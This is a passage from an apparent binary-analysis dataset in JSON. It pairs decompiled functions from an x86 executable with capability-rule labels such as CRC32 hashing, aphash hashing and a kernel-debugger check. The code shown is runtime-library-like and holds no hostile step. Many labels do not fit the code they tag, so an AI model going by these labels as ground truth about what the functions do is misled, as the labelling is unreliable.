            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00470bce(uint32_t arg_8h)\n\n{\n    return (arg_8h & 8 | (arg_8h >> 2 & 8 | arg_8h & 0x10) >> 2) >> 1 | ((arg_8h & 2) << 3 | arg_8h & 4) * 2 |\n           (arg_8h & 1) << 4;\n}\n",
        "token_count": 103
    },
    "00470c12": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00470c12(uint32_t arg_8h)\n\n{\n    return (arg_8h & 8 | (arg_8h >> 2 & 8 | arg_8h & 0x10) >> 2) >> 1 | ((arg_8h & 2) << 3 | arg_8h & 4) * 2 |\n           (arg_8h & 1) << 4;\n}\n",
        "token_count": 103
    },
    "00470c56": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00470c56(uint32_t arg_8h)\n\n{\n    return (arg_8h & 8 | arg_8h >> 3 & 6) >> 1 | ((arg_8h & 2) << 2 | arg_8h & 4) * 2 | (arg_8h & 1) << 5;\n}\n",
        "token_count": 87
    },
    "00470c90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00470c90(uint32_t arg_8h)\n\n{\n    return (arg_8h & 8 | arg_8h >> 3 & 6) >> 1 | ((arg_8h & 2) << 2 | arg_8h & 4) * 2 | (arg_8h & 1) << 5;\n}\n",
        "token_count": 87
    },
    "0047104b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0047104b(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t var_4h;\n    \n    var_4h = 0x1000;\n    uVar2 = 0;\n    if ((arg_8h & 0x300) == 0) {\n        var_4h = 0x2000;\n    }\n    else if ((arg_8h & 0x300) != 0x200) {\n        var_4h = 0;\n    }\n    uVar1 = arg_8h & 0xc00;\n    if (uVar1 != 0) {\n        if (uVar1 == 0x400) {\n            uVar2 = 0x100;\n        }\n        else if (uVar1 == 0x800) {\n            uVar2 = 0x200;\n        }\n        else if (uVar1 == 0xc00) {\n            uVar2 = 0x300;\n        }\n    }\n    return (arg_8h & 4 | (arg_8h & 2) << 3) * 2 | ((arg_8h >> 2 & 8 | arg_8h & 0x10) >> 2 | arg_8h & 8) >> 1 |\n           (arg_8h & 1) << 4 | (arg_8h & 0x1000) << 2 | var_4h | uVar2;\n}\n",
        "token_count": 343
    },
    "004710f8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004710f8(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar1 = arg_8h >> 2;\n    uVar2 = arg_8h & 0xc00;\n    uVar3 = (arg_8h & 0xc03fffff) >> 0x16;\n    uVar4 = 0;\n    if (uVar2 == 0x400) {\n        uVar2 = 0x8040;\n    }\n    else if (uVar2 == 0x800) {\n        uVar2 = 0x40;\n    }\n    else if (uVar2 == 0xc00) {\n        uVar2 = 0x8000;\n    }\n    else {\n        uVar2 = 0;\n    }\n    if (uVar3 != 0) {\n        if (uVar3 == 0x100) {\n            uVar4 = 0x2000;\n        }\n        else if (uVar3 == 0x200) {\n            uVar4 = 0x4000;\n        }\n        else if (uVar3 == 0x300) {\n            uVar4 = 0x6000;\n        }\n    }\n    return ((((uVar1 & 0x1000000) >> 0x16 | (((uVar1 & 0x400000) >> 0x16) << 2 | (uVar1 & 0x800000) >> 0x16) << 2) << 2\n            | (uVar1 & 0x2000000) >> 0x16) << 3 | (uVar1 & 0xc000000) >> 0x16) << 3 | uVar2 | uVar4;\n}\n",
        "token_count": 420
    },
    "004711f5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004711f5(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    uVar3 = arg_8h >> 2;\n    uVar4 = 0;\n    if ((arg_8h & 0x3000) == 0) {\n        uVar2 = 0x300;\n    }\n    else {\n        uVar2 = uVar4;\n        if ((arg_8h & 0x3000) == 0x1000) {\n            uVar2 = 0x200;\n        }\n    }\n    uVar1 = (arg_8h & 0xc00000) >> 0xe;\n    if (uVar1 != 0) {\n        if (uVar1 == 0x100) {\n            uVar4 = 0x400;\n        }\n        else if (uVar1 == 0x200) {\n            uVar4 = 0x800;\n        }\n        else if (uVar1 == 0x300) {\n            uVar4 = 0xc00;\n        }\n    }\n    return ((uVar3 & 0x10000) >> 0xe | (((uVar3 & 0x4000) >> 0xe) << 2 | (uVar3 & 0x8000) >> 0xe) << 2) * 2 |\n           (uVar3 & 0xc0000) >> 0x12 | (uVar3 & 0x20000) >> 0xf | arg_8h >> 2 & 0x1000 | uVar2 | uVar4;\n}\n",
        "token_count": 393
    },
    "00471457": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t fcn.00471457(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUStatusWord;\n    uint var_4h;\n    \n    uVar1 = in_FPUStatusWord;\n    uVar1 = ((in_FPUStatusWord >> 2 & 8 | uVar1 & 0x10) >> 2 | uVar1 & 8) >> 1 | ((uVar1 & 2) << 3 | uVar1 & 4) * 2 |\n            (uVar1 & 1) << 4;\n    if (*0x6ccba8 < 1) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = in_MXCSR & 0x3f;\n    }\n    uVar2 = ((uVar2 >> 2 & 8 | uVar2 & 0x10) >> 2 | uVar2 & 8) >> 1 | ((uVar2 & 2) << 3 | uVar2 & 4) * 2 |\n            (uVar2 & 1) << 4;\n    return (uVar2 << 8 | uVar1) << 0x10 | uVar2 | uVar1;\n}\n",
        "token_count": 295
    },
    "0047157c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047157c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    puVar2 = &var_20h;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00471899": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00471899(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00430e10(0x486f48, 0x10);\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = iVar1;\n    if (iVar1 == 0) {\n        iVar1 = *(unaff_EBP + 0xc);\n        *(iVar1 + 0x1c) = 1;\n        *(iVar1 + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, iVar1);\n    }\n    else {\n        if ((*(iVar1 + 0xc) >> 0xc & 1) == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n            fcn.0045f18d(iVar1);\n            *(unaff_EBP + -4) = 0;\n            uVar2 = fcn.00471930(iVar1, *(unaff_EBP + 0xc));\n            *(unaff_EBP + -0x1c) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.00471928();\n            goto code_r0x00471912;\n        }\n        fcn.004743cf(iVar1);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x00471912:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 463
    },
    "00471930": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00471930(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    \n    if (arg_8h == 0) {\n        *(arg_ch + 0x1c) = 1;\n        *(arg_ch + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_ch);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = 0xffffffff;\n        if ((*(arg_8h + 0xc) >> 0xd & 1) != 0) {\n            uVar1 = fcn.00464908(arg_8h, arg_ch);\n            fcn.0046d536(arg_8h);\n            arg_8h_00 = fcn.0045efb0(arg_8h);\n            iVar2 = fcn.004741b9(arg_8h_00, arg_ch);\n            if (iVar2 < 0) {\n                uVar1 = 0xffffffff;\n            }\n            else if (*(arg_8h + 0x1c) != 0) {\n                fcn.0045d185(*(arg_8h + 0x1c));\n                *(arg_8h + 0x1c) = 0;\n            }\n        }\n        fcn.004743cf(arg_8h);\n    }\n    return uVar1;\n}\n",
        "token_count": 343
    },
    "00471a1e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint __cdecl fcn.00471a1e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t lpCriticalSection;\n    bool bVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00430e10(0x486f68, 0x14);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        iVar3 = *(unaff_EBP + 0x14);\n        *(iVar3 + 0x24) = 1;\n        *(iVar3 + 0x20) = 0;\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 9;\n    }\n    else {\n        if ((lpCriticalSection < 0) || (*0x6cd830 <= lpCriticalSection)) {\n            bVar1 = false;\n        }\n        else {\n            bVar1 = true;\n        }\n        if (bVar1) {\n            *(unaff_EBP + -0x20) = lpCriticalSection >> 6;\n            iVar3 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x24) = iVar3;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x6cd630) + 0x28 + iVar3) & 1) != 0) {\n                fcn.00464eb7(lpCriticalSection);\n                uVar2 = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*(unaff_EBP + -0x24) + 0x28 + *(*(unaff_EBP + -0x20) * 4 + 0x6cd630)) & 1) == 0) {\n                    iVar3 = *(unaff_EBP + 0x14);\n                    *(iVar3 + 0x1c) = 1;\n                    *(iVar3 + 0x18) = 9;\n                    *(iVar3 + 0x24) = 1;\n                    *(iVar3 + 0x20) = 0;\n                }\n                else {\n                    uVar2 = fcn.00471c54(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14)\n                                        );\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00471b27();\n                goto code_r0x00471b11;\n            }\n        }\n        iVar3 = *(unaff_EBP + 0x14);\n        *(iVar3 + 0x24) = 1;\n        *(iVar3 + 0x20) = 0;\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 9;\n        fcn.0043bac1(0, 0, 0, 0, 0, iVar3);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x00471b11:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 860
    },
    "00471b2f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nulong __cdecl fcn.00471b2f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t lpCriticalSection;\n    bool bVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00430e10(0x486f88, 0x18);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        iVar2 = *(unaff_EBP + 0x18);\n        *(iVar2 + 0x24) = 1;\n        *(iVar2 + 0x20) = 0;\n        *(iVar2 + 0x1c) = 1;\n        *(iVar2 + 0x18) = 9;\n    }\n    else {\n        if ((lpCriticalSection < 0) || (*0x6cd830 <= lpCriticalSection)) {\n            bVar1 = false;\n        }\n        else {\n            bVar1 = true;\n        }\n        if (bVar1) {\n            *(unaff_EBP + -0x1c) = lpCriticalSection >> 6;\n            iVar2 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x20) = iVar2;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x6cd630) + 0x28 + iVar2) & 1) != 0) {\n                fcn.00464eb7(lpCriticalSection);\n                *(unaff_EBP + -0x28) = 0xffffffff;\n                *(unaff_EBP + -0x24) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*(unaff_EBP + -0x20) + 0x28 + *(*(unaff_EBP + -0x1c) * 4 + 0x6cd630)) & 1) == 0) {\n                    iVar2 = *(unaff_EBP + 0x18);\n                    *(iVar2 + 0x1c) = 1;\n                    *(iVar2 + 0x18) = 9;\n                    *(iVar2 + 0x24) = 1;\n                    *(iVar2 + 0x20) = 0;\n                    uVar3 = 0xffffffffffffffff;\n                }\n                else {\n                    uVar3 = fcn.00471cb1(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14)\n                                         , *(unaff_EBP + 0x18));\n                    *(unaff_EBP + -0x28) = uVar3;\n                    *(unaff_EBP + -0x24) = uVar3 >> 0x20;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00471c4c();\n                goto code_r0x00471c31;\n            }\n        }\n        iVar2 = *(unaff_EBP + 0x18);\n        *(iVar2 + 0x24) = 1;\n        *(iVar2 + 0x20) = 0;\n        *(iVar2 + 0x1c) = 1;\n        *(iVar2 + 0x18) = 9;\n        fcn.0043bac1(0, 0, 0, 0, 0, iVar2);\n    }\n    uVar3 = 0xffffffffffffffff;\ncode_r0x00471c31:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar3;\n}\n",
        "token_count": 926
    },
    "004732f7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint16_t __cdecl fcn.004732f7(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == -1) {\n        return 0xffff;\n    }\n    fcn.00461b27(arg_ch);\n    uVar1 = arg_8h;\n    if (*(var_10h + 8) == 0xfde9) {\n        if (arg_8h < 0x80) {\n            if ((*(\n                  L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                  + (arg_8h & 0xff)) & 1) != 0) {\n                uVar1 = *(*(var_10h + 0x94) + (arg_8h & 0xff));\n            }\n            arg_8h._0_2_ = uVar1;\n            goto code_r0x004733b8;\n        }\n    }\n    else {\n        if (arg_8h < 0x100) {\n            if ((*(\n                  L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                  + (arg_8h & 0xff)) & 1) == 0) {\n                arg_8h._0_2_ = arg_8h & 0xff;\n            }\n            else {\n                arg_8h._0_2_ = *(*(var_10h + 0x94) + (arg_8h & 0xff));\n            }\n            goto code_r0x004733b8;\n        }\n        if (*(var_10h + 0xa8) == 0) goto code_r0x004733b8;\n    }\n    iVar2 = fcn.004746bc(*(var_10h + 0xa8), 0x100, &arg_8h, 1, &var_4h, 1);\n    arg_8h._0_2_ = var_4h;\n    if (iVar2 == 0) {\n    }\ncode_r0x004733b8:\n    if (var_8h != '\\0') {\n        *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n    }\n    return arg_8h;\n}\n",
        "token_count": 1203
    },
    "00473fdc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00473fdc(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint32_t *arg_ch_00;\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.00430e10();\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00464eb7(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = ***(unaff_EBP + 0xc);\n    arg_ch_00 = (*(unaff_EBP + 0xc))[1];\n    if ((*(*((arg_8h_00 >> 6) * 4 + 0x6cd630) + 0x28 + (arg_8h_00 & 0x3f) * 0x38) & 1) == 0) {\n        *(arg_ch_00 + 7) = 1;\n        arg_ch_00[6] = 9;\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = fcn.0047428c(arg_8h_00, arg_ch_00);\n    }\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00474061(0x487008, noname_1, unaff_retaddr);\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 429
    },
    "004741b9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004741b9(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint *var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (arg_8h == 0xfffffffe) {\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x24) = 1;\n        *(arg_ch + 0x1c) = 1;\n        *(arg_ch + 0x18) = 9;\n    }\n    else {\n        if (((-1 < arg_8h) && (arg_8h < *0x6cd830)) &&\n           ((*(*((arg_8h >> 6) * 4 + 0x6cd630) + 0x28 + (arg_8h & 0x3f) * 0x38) & 1) != 0)) {\n            var_14h = &arg_8h;\n            var_8h = arg_8h;\n            var_10h = arg_ch;\n            var_ch = arg_8h;\n            uVar1 = fcn.00473fdc(&var_ch, &var_14h);\n            return uVar1;\n        }\n        *(arg_ch + 0x24) = 1;\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x1c) = 1;\n        *(arg_ch + 0x18) = 9;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_ch);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 409
    },
    "00474c08": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00474c08(uint32_t arg_8h, double *arg_ch, uint32_t arg_10h)\n\n{\n    double dVar1;\n    double dVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    double dVar6;\n    ushort uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    float10 fVar12;\n    float10 fVar13;\n    uint32_t var_20h;\n    uint8_t var_1ch;\n    uchar uStack31;\n    uint var_1ah;\n    int32_t var_14h;\n    uint var_ch;\n    double dStack20;\n    uint32_t var_8h;\n    char var_3h;\n    char var_2h;\n    uint var_1h;\n    \n    uVar11 = arg_8h & 0x1f;\n    if (((arg_8h & 8) != 0) && ((arg_10h & 1) != 0)) {\n        fcn.0047047e(1);\n        uVar11 = arg_8h & 0x17;\n        goto code_r0x00474e67;\n    }\n    if ((arg_8h & arg_10h & 4) != 0) {\n        fcn.0047047e(4);\n        uVar11 = arg_8h & 0x1b;\n        goto code_r0x00474e67;\n    }\n    if (((arg_8h & 1) == 0) || ((arg_10h & 8) == 0)) {\n        if (((arg_8h & 2) == 0) || ((arg_10h & 0x10) == 0)) goto code_r0x00474e67;\n        dVar2 = *arg_ch;\n        uVar11 = arg_8h >> 4 & 1;\n        var_8h = uVar11;\n        if (dVar2 == 0.0) {\ncode_r0x00474e5b:\n            fcn.0047047e(0x10);\n        }\n        else {\n            fVar12 = fcn.004752cc(SUB84(dVar2, 0), dVar2 >> 0x20, &var_14h);\n            var_14h = var_14h + -0x600;\n            dVar2 = fVar12;\n            var_20h = SUB84(dVar2, 0);\n            var_1ch = dVar2 >> 0x20;\n            uStack31 = dVar2 >> 0x28;\n            var_1ah._0_2_ = dVar2 >> 0x30;\n            fVar13 = 0;\n            if (var_14h < -0x432) {\n                fVar13 = fVar13 * fVar12;\n                uVar11 = 1;\n            }\n            else {\n                var_1h._0_1_ = ((fVar13 < fVar12) << 8 | (fVar13 == fVar12) << 0xe) == 0;\n                var_1ah._0_2_ = var_1ah & 0xf | 0x10;\n                uVar8 = 0;\n                uVar7 = 0;\n                var_3h = '\\0';\n                var_2h = '\\0';\n                if (var_14h < -0x3fd) {\n                    var_14h = -0x3fd - var_14h;\n                    do {\n                        uVar10 = var_20h & 1;\n                        if ((uVar10 != 0) && (uVar11 == 0)) {\n                            uVar11 = 1;\n                        }\n                        if (uVar8 != '\\0') {\n                            uVar8 = 0x100;\n                        }\n                        var_20h = var_20h >> 1;\n                        uVar4 = uVar8 & 0xffffff00;\n                        uVar8 = uVar4 | uVar10;\n                        uVar7 = uVar8;\n                        if ((var_1ch & 1) != 0) {\n                            var_20h = var_20h | 0x80000000;\n                        }\n                        uVar3 = CONCAT22(var_1ah, CONCAT11(uStack31, var_1ch)) >> 1;\n                        var_1ch = uVar3;\n                        uStack31 = uVar3 >> 8;\n                        var_1ah._0_2_ = var_1ah >> 1;\n                        var_14h = var_14h + -1;\n                    } while (var_14h != 0);\n                    var_3h = uVar4 >> 8;\n                    var_2h = uVar10;\n                    var_8h = uVar11;\n                }\n                dStack20 = CONCAT26(var_1ah, CONCAT15(uStack31, CONCAT14(var_1ch, var_20h)));\n                fVar13 = dStack20;\n                if (var_1h) {\n                    fVar13 = -fVar13;\n                    dStack20 = fVar13;\n                    dVar2 = fVar13;\n                    var_20h = SUB84(dVar2, 0);\n                    var_1ch = dVar2 >> 0x20;\n                    uStack31 = dVar2 >> 0x28;\n                    var_1ah._0_2_ = dVar2 >> 0x30;\n                }\n                if ((uVar7 != '\\0') || (uVar11 = var_8h,  uVar7 >> 8 != '\\0')) {\n                    iVar9 = fcn.0046cc3c();\n                    uVar11 = var_8h;\n                    if (iVar9 == 0) {\n                        if (var_2h == '\\0') goto code_r0x00474e48;\n                        if (var_3h == '\\0') {\n                            uVar5 = var_20h & 1;\n                            goto code_r0x00474e37;\n                        }\n                    }\n                    else {\n                        uVar5 = var_1h;\n                        if (iVar9 != 0x100) {\n                            if (iVar9 != 0x200) goto code_r0x00474e48;\n                            uVar5 = var_1h ^ 1;\n                        }\ncode_r0x00474e37:\n                        if (uVar5 == 0) {\ncode_r0x00474e48:\n                            fVar13 = dStack20;\n                            goto code_r0x00474e4e;\n                        }\n                    }\n                    iVar9 = CONCAT22(var_1ah, CONCAT11(uStack31, var_1ch)) + (0xfffffffe < var_20h);\n                    var_1ch = iVar9;\n                    uStack31 = iVar9 >> 8;\n                    var_1ah._0_2_ = iVar9 >> 0x10;\n                    fVar13 = CONCAT26(var_1ah, CONCAT15(uStack31, CONCAT14(var_1ch, var_20h + 1)));\n                }\n            }\ncode_r0x00474e4e:\n            *arg_ch = fVar13;\n            if (uVar11 != 0) goto code_r0x00474e5b;\n        }\n        uVar11 = arg_8h & 0x1d;\n        goto code_r0x00474e67;\n    }\n    fcn.0047047e(8);\n    uVar11 = arg_10h & 0xc00;\n    dVar2 = *0x484388;\n    dVar6 = *0x484388;\n    if (uVar11 == 0) {\n        dVar1 = *arg_ch;\njoined_r0x00474ca9:\n        if (dVar1 <= 0.0) {\n            dVar2 = -dVar6;\n        }\n        *arg_ch = dVar2;\n    }\n    else {\n        if (uVar11 